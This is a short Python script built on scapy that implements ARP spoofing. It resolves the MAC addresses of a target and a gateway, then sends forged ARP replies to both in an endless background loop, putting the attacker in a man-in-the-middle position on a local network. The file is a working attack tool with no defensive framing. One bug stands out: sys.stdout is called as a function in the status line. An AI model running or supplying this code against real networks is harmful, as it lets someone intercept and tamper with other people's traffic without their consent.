#
"""

"""

import scapy.all as scapy
import sys
import time
from multiprocessing import Process

class ARP:
    def __init__(self):
        self.targetIP = None
        self.spoofWithIP = None

        return None


    # get the mac address for a device on IP ip
    def getMacAddress(self, ip):
        ipARP = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

        ARP_ip_and_message = broadcast / ipARP

        ARP_return = scapy.srp(ARP_ip_and_message, timeout=1, verbose=False)[0]

        mac = ARP_return[0][1].hwsrc
        return mac


    # spoof the ARP
    def ARP_poison(self, targetIP, spoofWithIP, loop):
        self.targetIP = targetIP
        self.spoofWithIP = spoofWithIP

        if loop:
            self.ARP_poisonThread = Process(target=self.ARP_poisoning_thread)
            self.ARP_poisonThread.start()

    def ARP_poisoning_thread(self):

        packetsSent = 0
        while True:
            packetsSent += 2

            # to victim
            packet = scapy.ARP(op=2,
                               pdst=self.targetIP,
                               hwdst=self.getMacAddress(self.targetIP),
                               psrc=self.spoofWithIP)
            scapy.send(packet, verbose=False)

            # to gateway
            packet = scapy.ARP(op=2,
                               pdst=self.spoofWithIP,
                               hwdst=self.getMacAddress(self.spoofWithIP),
                               psrc=self.targetIP)
            scapy.send(packet, verbose=False)



            sys.stdout("[+] Packets sent " + str(packetsSent), end="\r")
            sys.stdout.flush()
            time.sleep(2)